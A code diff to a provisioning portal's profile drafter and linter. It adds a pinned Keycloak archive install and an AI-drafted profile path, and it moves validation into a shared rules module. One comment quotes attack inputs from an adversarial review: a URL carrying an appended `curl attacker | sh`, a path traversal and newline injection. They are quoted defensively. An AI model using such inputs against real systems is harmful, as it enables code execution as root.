@@ -34,6 +34,7 @@ from sqlalchemy import select
 from sqlalchemy.orm import Session
 
 from api.ai_drafter import AiUnavailable, ai_mode, ai_model, anthropic_client
+from common import profile_rules
 from db.models import Technology
 
 VERSIONED_CODE = re.compile(r"^([a-z][a-z-]*?)(\d+)$")
@@ -298,28 +299,23 @@ def review_profile(profile: dict,
               "success.")
 
     families = [f for f in ("rhel", "debian") if isinstance(profile.get(f), dict)]
-    if not families:
-        block("no-family",
-              "The profile covers no OS family. Package and service names differ per "
-              "family — Apache is `httpd` on Oracle Linux and `apache2` on Ubuntu — so "
-              "a profile that names neither cannot install anything.")
-
     for family in families:
-        blk = profile[family]
-        if not blk.get("packages"):
-            block("no-packages", f"The {family} block installs no package.")
-        if not blk.get("services"):
+        if not profile[family].get("services"):
             findings.append(Finding(
                 "warning", "no-service",
                 f"The {family} block enables no systemd unit, so the software would be "
                 f"installed but not running."))
 
-    if not str(profile.get("version_command") or "").strip():
-        block("no-version-command",
-              "The profile gives no way to ask the machine what it actually received. "
-              "A package called `redis` delivered Redis 6.2 on Oracle Linux while the "
-              "catalogue promised Redis 7, and nothing noticed until somebody logged "
-              "in. A recipe that cannot be checked cannot be certified.")
+    # --- archive installs: root is about to fetch and execute this ----------
+    #
+    # Delegated to common/profile_rules, which BOTH services enforce. The first
+    # version of these rules lived here and checked string prefixes: an
+    # adversarial review demonstrated that `https://x/y.tgz; curl attacker | sh`
+    # starts with "https://", `/opt/../..` starts with "/opt/", and a newline in
+    # unit.exec_start injected a whole extra cloud-init file — a fully weaponised
+    # profile returned zero findings.
+    for problem in profile_rules.profile_problems(profile):
+        block("profile-refused", problem)
 
     if code and code in shipped_codes:
         block("shadows-shipped",
@@ -327,6 +323,112 @@ def review_profile(profile: dict,
               f"its place — the same rule the blueprint registry applies to manifests.")
 
     return findings
+
+
+# Software that ships as an ARCHIVE, not a package (C6b). REQ-2026-0177 proved
+# on a real machine that `dnf install keycloak` finds nothing — the machine said
+# "package keycloak is not installed" and the proof failed on that evidence. A
+# package-name guess cannot install a tarball, so for these the drafter needs to
+# KNOW: the release URL, its checksum, and the unit that runs it.
+#
+# EVERY FACT HERE IS MEASURED, NOT RECALLED. The version comes from the
+# project's own releases API and the sha256 was computed from the downloaded
+# artifact on the date noted — because a plausible URL from memory is exactly
+# the class of guess the proof exists to refute, and the checksum is what stands
+# between root and a tampered mirror. An entry is still only a CLAIM: the proof
+# boots a machine and the machine decides, same as everything else.
+#
+# Pinned rather than "latest" on purpose. Cloud facts (shapes, images) must be
+# resolved at run time because the cloud changes them under us; a release
+# artifact is immutable, and pinning it is what makes the checksum meaningful.
+# The 30-day certification expiry re-proves the pin on a rhythm.
+ARCHIVE_KNOWLEDGE: dict[str, dict] = {
+    "keycloak": {
+        # keycloak/keycloak releases/latest, asked 2026-08-22; sha256 computed
+        # from the artifact the same day (265 MB downloaded and hashed).
+        "version": "26.7.2",
+        "expects": "26",
+        "ports": [8080],
+        "version_command": "/opt/keycloak/bin/kc.sh --version 2>&1",
+        "archive": {
+            "url": ("https://github.com/keycloak/keycloak/releases/download/"
+                    "26.7.2/keycloak-26.7.2.tar.gz"),
+            "sha256": "4f3ce3b797a9d98998b7f1a6bd5d2b9832100faea66c48988713a9b23eda5c44",
+            "dest": "/opt/keycloak",
+            "user": "keycloak",
+            "unit": {
+                "description": "Keycloak",
+                # start-dev: http on 8080, no TLS/hostname config required. Right
+                # for the Development tier this portal certifies in; a production
+                # profile would carry `start` plus vault-referenced config, and
+                # would need its own proof.
+                "exec_start": "/opt/keycloak/bin/kc.sh start-dev",
+            },
+        },
+        # java-21-openjdk-headless is MACHINE-PROVEN on OL9: the java21 profile
+        # installed it and the machine reported 21.0.11 (REQ-2026-0139).
+        "rhel": {"packages": ["java-21-openjdk-headless"],
+                 "services": ["keycloak"]},
+    },
+}
+
+
+def _guessed_profile(code: str, target: str) -> dict:
+    """The obvious guess: a package named after the technology.
+
+    Right surprisingly often (nginx, redis) and wrong in a way that costs
+    nothing to discover — the proof boots a machine and the machine says whether
+    the package exists. What it can never do is install software that ships as
+    an archive; that needs ARCHIVE_KNOWLEDGE or the live model."""
+    return {
+        "code": code,
+        "builds_on": "oci/service-vm" if target == "oci" else "",
+        "ports": [],
+        "version_command": f"{code} --version 2>&1",
+        "rhel": {"packages": [code], "services": [code]},
+        "_note": ("DRAFT — proposed by the agent, proven by booting a machine. "
+                  "The package name is the obvious guess and may not exist in the "
+                  "image's repositories; the machine's own report decides."),
+    }
+
+
+def _model_profile(code: str, target: str) -> dict:  # pragma: no cover - live path
+    """Ask the model for a technology profile. Checked, never trusted.
+
+    Same stance as _model_draft: the output goes through review_profile — https
+    archives only, a unit for what it starts, a version command — and then a
+    proof build, where the machine has the last word. A missing sha256 survives
+    the linter as a warning because the model cannot compute one, but the https
+    requirement and the sandbox proof still bound what a hallucinated URL can do:
+    fail, visibly, having built nothing.
+    """
+    client = anthropic_client()
+    prompt = (
+        f"Write a JSON technology profile that installs {code} on Oracle Linux 9 "
+        f"for a provisioning portal. Schema: {{code, builds_on: 'oci/service-vm', "
+        f"ports: [..], expects: 'major version', version_command, archive?: "
+        f"{{url (https only), sha256?, dest under /opt, user, unit: "
+        f"{{description, exec_start}}}}, rhel: {{packages: [real OL9 RPMs only], "
+        f"services: [..]}}}}. Use an archive only when the software does not ship "
+        f"as an OL9 package. Pin a real release URL. Return ONLY the JSON object."
+    )
+    message = client.messages.create(
+        model=ai_model(), max_tokens=1500,
+        messages=[{"role": "user", "content": prompt}])
+    text = "".join(getattr(b, "text", "") for b in message.content).strip()
+    if text.startswith("```"):
+        text = text.strip("`").lstrip("json").strip()
+    try:
+        profile = json.loads(text)
+    except ValueError as exc:
+        raise AiUnavailable(f"The model did not return a JSON profile: {exc}")
+    if not isinstance(profile, dict):
+        raise AiUnavailable("The model returned JSON that is not an object.")
+    profile["code"] = code
+    profile.setdefault("builds_on", "oci/service-vm" if target == "oci" else "")
+    profile["_note"] = ("DRAFT — proposed by the model, checked by the linter, "
+                        "proven by booting a machine. The machine decides.")
+    return profile
 
 
 def draft_profile(candidate: str, target: str = "oci") -> Draft:
@@ -343,16 +445,27 @@ def draft_profile(candidate: str, target: str = "oci") -> Draft:
     checks is how "Redis 7" shipped 6.2.
     """
     code = (candidate or "").strip().lower()
-    profile = {
-        "code": code,
-        "builds_on": "oci/service-vm" if target == "oci" else "",
-        "ports": [],
-        "version_command": f"{code} --version 2>&1",
-        "rhel": {"packages": [code], "services": [code]},
-        "_note": ("DRAFT — proposed by the agent, proven by booting a machine. "
-                  "The package name is the obvious guess and may not exist in the "
-                  "image's repositories; the machine's own report decides."),
-    }
+    known = ARCHIVE_KNOWLEDGE.get(code)
+    if known:
+        profile = {
+            "code": code,
+            "builds_on": "oci/service-vm" if target == "oci" else "",
+            "ports": list(known.get("ports") or []),
+            "expects": known.get("expects", ""),
+            "version_command": known.get("version_command", ""),
+            "archive": dict(known["archive"]),
+            "rhel": dict(known.get("rhel") or {}),
+            "_note": ("DRAFT — an archive install from measured facts (pinned "
+                      "release, computed sha256), proven by booting a machine. "
+                      "The machine's own report decides."),
+        }
+    elif ai_mode() == "live":
+        try:
+            profile = _model_profile(code, target)
+        except AiUnavailable:
+            profile = _guessed_profile(code, target)
+    else:
+        profile = _guessed_profile(code, target)
     return Draft(
         candidate=candidate, kind="vm-service",
         files={f"generated/profiles/{code}.json": json.dumps(profile, indent=2)},
